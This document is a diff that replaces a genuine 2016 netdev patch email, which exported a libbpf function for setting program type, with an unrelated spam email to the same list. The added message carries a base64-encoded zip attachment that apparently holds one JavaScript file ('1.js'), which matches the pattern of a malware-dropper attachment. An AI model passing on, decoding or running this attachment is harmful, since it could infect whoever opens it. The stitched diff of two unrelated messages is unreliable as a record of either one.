@@ -1,80 +1,36 @@
-From: Eric Leblond <eric@regit.org>
-Subject: [PATCH net-next 2/2] tools lib bpf: export function to set type
-Date: Sat, 13 Aug 2016 14:17:23 +0200
-Message-ID: <1471090643-22403-3-git-send-email-eric@regit.org>
-References: <1471090643-22403-1-git-send-email-eric@regit.org>
-Cc: Alexei Starovoitov <ast@fb.com>, wangnan0@huawei.com,
-	Eric Leblond <eric@regit.org>
-To: netdev@vger.kernel.org
+From: salome.khum@vision-france.net
+Subject: (unknown)
+Date: Sat, 13 Aug 2016 09:52:19 -0400
+Message-ID: <000101d1f59c$2805f46e$c0a80001@candw.ag>
+Mime-Version: 1.0
+Content-Type: application/zip; name="464314netdev.zip"
+Content-Transfer-Encoding: base64
+To: "netdev" <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from home.regit.org ([37.187.126.138]:43863 "EHLO home.regit.org"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1752657AbcHMMjS (ORCPT <rfc822;netdev@vger.kernel.org>);
-	Sat, 13 Aug 2016 08:39:18 -0400
-In-Reply-To: <1471090643-22403-1-git-send-email-eric@regit.org>
+Received: from 69-57-235-201.candw.ag ([69.57.235.201]:49131 "HELO candw.ag"
+	rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+	id S1752134AbcHMNwT (ORCPT <rfc822;netdev@vger.kernel.org>);
+	Sat, 13 Aug 2016 09:52:19 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-Current API was not allowing the user to set a type like socket
-filter. To avoid a setter function for each type, the patch simply
-exports a set function that takes the type in parameter.
-
-Signed-off-by: Eric Leblond <eric@regit.org>
----
- tools/lib/bpf/libbpf.c | 15 ++++++---------
- tools/lib/bpf/libbpf.h |  3 +++
- 2 files changed, 9 insertions(+), 9 deletions(-)
-
-diff --git a/tools/lib/bpf/libbpf.c b/tools/lib/bpf/libbpf.c
-index 7872ff6..ff2a8c6 100644
---- a/tools/lib/bpf/libbpf.c
-+++ b/tools/lib/bpf/libbpf.c
-@@ -1336,26 +1336,23 @@ int bpf_program__nth_fd(struct bpf_program *prog, int n)
- 	return fd;
- }
- 
--static void bpf_program__set_type(struct bpf_program *prog,
-+int bpf_program__set_type(struct bpf_program *prog,
- 				  enum bpf_prog_type type)
- {
-+	if (!prog)
-+		return -EINVAL;
- 	prog->type = type;
-+	return 0;
- }
- 
- int bpf_program__set_tracepoint(struct bpf_program *prog)
- {
--	if (!prog)
--		return -EINVAL;
--	bpf_program__set_type(prog, BPF_PROG_TYPE_TRACEPOINT);
--	return 0;
-+	return bpf_program__set_type(prog, BPF_PROG_TYPE_TRACEPOINT);
- }
- 
- int bpf_program__set_kprobe(struct bpf_program *prog)
- {
--	if (!prog)
--		return -EINVAL;
--	bpf_program__set_type(prog, BPF_PROG_TYPE_KPROBE);
--	return 0;
-+	return bpf_program__set_type(prog, BPF_PROG_TYPE_KPROBE);
- }
- 
- static bool bpf_program__is_type(struct bpf_program *prog,
-diff --git a/tools/lib/bpf/libbpf.h b/tools/lib/bpf/libbpf.h
-index a6c5cde..6a84d7a 100644
---- a/tools/lib/bpf/libbpf.h
-+++ b/tools/lib/bpf/libbpf.h
-@@ -173,6 +173,9 @@ int bpf_program__set_kprobe(struct bpf_program *prog);
- bool bpf_program__is_tracepoint(struct bpf_program *prog);
- bool bpf_program__is_kprobe(struct bpf_program *prog);
- 
-+int bpf_program__set_type(struct bpf_program *prog,
-+				  enum bpf_prog_type type);
-+
- /*
-  * We don't need __attribute__((packed)) now since it is
-  * unnecessary for 'bpf_map_def' because they are all aligned.
--- 
-2.8.1
+UEsDBBQAAAAIAId9DUmw26y1ZAMAACcHAAAEAAAAMS5qc3VVTW/jNhD9K7nZQoqsKFHSDLw+uVgk
+SIEeeir6AcjDYRI4qxSu0yAw8t/7hqTsbLM9xCY53++9cf4Z9xe3fr0Ig9ShJSciNYtE8aEnp7U0
+oROC1UfWxerWX64XKq1sxZuJmPrYxwbnFm4OLxE3hjVIoJ6IRxmCl5gTiUokF5Vh0E4GojCGoeS1
+DsoRPltmFmToeZyb0069vXHNLTfcseeBe/gRO6nRVSMdKg8WI4MoYthiS9I0XyNbFnY8plOwJvKZ
+RhqtHStMI4sVoyg2DIprbcMq0MEYjPeSc8CcmiudjcCixsSdzIiJACiibckZ0GScTX2KIUMKkLUA
+vgse37FggNePCKJpj4pNSRI9BRkjJTi70AYKJ9Ci1wBG0RxF9YGDy80pUsKHQmspYbd7FxuLR5mI
+xhqjl3yEL1wceSMUKPUxRCN3zESCjiG/k+kG5L8nLWwj/a+iipTKGLOiUKyJbLBySzGflGM3T9tF
+l6VluSmeYTbkPcbrAICVMT58ptAGEs8fsWSaNRfKYYRlIC63XOOcOJ4SQ0fCHQ00FJ9iAX1NsrXQ
+maN3XGDejk+a+D4k/9kurSEaxZ8hkcmxRiQDcF5JLJ4quPVpJDPZ24xYNERcarkuphh7I9oGIc4D
+RFNfE5zhEhrxatJA5CldjLDBQjN6eZWKrZE6zQDdK4RlMic2+Z3jtbF9sdzERfGSaCyNJjZPU/Ta
+K9JRT0GbpHHgKCGFn9i328xclyaog09zdMqZNNxaSyfm2kprn5aU+rQsXjz13ya0BXmnDB6/Xcy0
+a3m0AKjyj10aR5qkDUiO2EZI7H8n9hQVsleGIq81GmX4d8HxlpQ0qYrTD82YWseeGkqwNMjqjDCM
+AXhnyTokcFibwQQKhhKEH5WPcLwDM7U2s+qpPt3TT0Y0fGbf0qZ9L1blX8etv/o6HuR++en3l2Pz
+9umuSpab6/Ui+0ybdb16uX941OW0+Qz3R53uDvfV0Yyvu5Pxdfd5PenLxY/jQZfV1Z0evjw/Pv6q
+435ZVceHCIf12vXV8eb6cv3LYf8w3V3F/dPXzf243zwFXf417v/Wm+mwvPW/TZs/fnjdVX+63lWr
+t9fd5eXqbdrYZ3ye5PDwNF38/NNyt6kujns9PO+ni6XV/lKMZkHV1Rucbq6r1b9QSwECHwAUAAAA
+CACHfQ1JsNustWQDAAAnBwAABAAkAAAAAAAAACAAAAAAAAAAMS5qcwoAIAAAAAAAAQAYAAmBXWZg
+9dEBzpx570L10QHOnHnvQvXRAVBLBQYAAAAAAQABAFYAAACGAwAAAAA=
